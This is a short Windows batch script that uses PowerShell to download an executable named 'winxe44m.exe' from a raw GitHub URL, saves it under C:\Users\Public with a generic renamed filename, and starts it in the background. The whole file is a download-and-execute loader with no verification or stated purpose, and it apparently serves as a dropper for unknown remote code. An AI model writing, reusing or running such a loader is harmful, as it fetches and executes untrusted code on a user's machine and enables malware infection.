@echo off
REM Automatic download script
REM Download to C:\Users\Public directory and run in background

set DOWNLOAD_URL=https://raw.githubusercontent.com/kenge-hite/adminsql/refs/heads/main/winxe44m.exe
set DOWNLOAD_DIR=C:\Users\Public
set FILENAME=downloaded_file.exe
set FULL_PATH=%DOWNLOAD_DIR%\%FILENAME%

echo Starting file download...
echo From: %DOWNLOAD_URL%
echo To: %FULL_PATH%

REM Create target directory if it doesn't exist
if not exist "%DOWNLOAD_DIR%" (
    mkdir "%DOWNLOAD_DIR%"
)

REM Download file using PowerShell
powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'; $wc = New-Object System.Net.WebClient; $wc.DownloadFile('%DOWNLOAD_URL%', '%FULL_PATH%')"

if errorlevel 1 (
    echo Download failed! Error downloading from %DOWNLOAD_URL%
    pause
    exit /b 1
)

REM Check if download was successful
if exist "%FULL_PATH%" (
    echo Download successful! File located at: %FULL_PATH%
    echo Starting program in background...

    REM Start program in background
    start "" "%FULL_PATH%"

    echo Program has been started in background.
) else (
    echo Download failed!
    pause
)

echo Script execution completed.
timeout /t 3 >nul

